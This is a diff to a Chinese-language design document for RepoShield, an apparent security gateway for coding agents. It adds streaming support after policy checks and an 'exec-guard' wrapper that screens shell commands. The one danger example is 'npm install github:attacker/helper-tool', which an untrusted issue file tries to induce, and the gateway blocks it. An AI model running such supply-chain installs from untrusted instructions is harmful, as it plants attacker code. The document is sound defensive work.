@@ -196,15 +196,25 @@ existing = store.latest_valid_grant(action, center=center, contract=contract)
 
 ## Streaming 状态
 
-当前 Gateway 的真实 upstream client 会强制：
+当前 Gateway 已经接受 agent 侧的：
+
+```text
+stream = true
+```
+
+并返回 OpenAI-compatible `text/event-stream` 响应。
+
+实现方式是“治理后再流式输出”：RepoShield 仍会先从 upstream 拿到完整 assistant message / tool_calls，完成 `InstructionIR -> ActionIR -> PolicyRuntime` 判断后，再把安全响应编码成 SSE chunks 返回给 agent。
+
+真实 upstream client 当前仍会强制：
 
 ```text
 stream = false
 ```
 
-原因是现有 HTTP server 返回普通 JSON，不是 SSE。这样可以稳定完成治理链路，但还不支持完整 streaming token / streaming tool call 透传。
+原因是不能在未完整识别 tool call 前把上游 delta 直接放给 agent 执行。这样可以兼容需要 SSE 响应的 agent，同时保持“执行前治理”的安全边界。
 
-如果目标 agent 强依赖 `stream=true`，下一步需要实现：
+这还不是完整 token-by-token upstream streaming proxy。更完整的下一步是：
 
 ```text
 SSE proxy
@@ -212,6 +222,39 @@ SSE proxy
   -> tool call 完整后执行治理
   -> 安全后继续下发，危险则中止并返回阻断事件
 ```
+
+## exec-guard：真实 shell 工具前置守卫
+
+如果某个 agent 不能改 `base_url`，但可以自定义 shell 工具命令，可以把原始命令包一层：
+
+```bash
+PYTHONPATH=src python -m reposhield exec-guard \
+  --repo ./your-repo \
+  --task "修复登录按钮并运行测试" \
+  --source-file ./issue.md \
+  -- npm test
+```
+
+执行规则：
+
+```text
+allow                  在宿主仓库中执行命令
+allow_in_sandbox       只做 sandbox preflight，不直接改宿主机
+sandbox_then_approval  不执行，返回需要审批
+block / quarantine     不执行，返回阻断
+```
+
+危险示例：
+
+```bash
+PYTHONPATH=src python -m reposhield exec-guard \
+  --repo ./your-repo \
+  --task "修复登录按钮并运行测试" \
+  --source-file ./issue.md \
+  -- npm install github:attacker/helper-tool
+```
+
+如果 `issue.md` 是不可信来源，这类供应链动作会在执行前被阻断。
 
 ## 当前完整度判断
 
@@ -234,4 +277,3 @@ Gateway bench
 需要审批 UI / 团队策略 / 权限管理
 需要更完整的 shell parser 和绕过测试
 ```
-
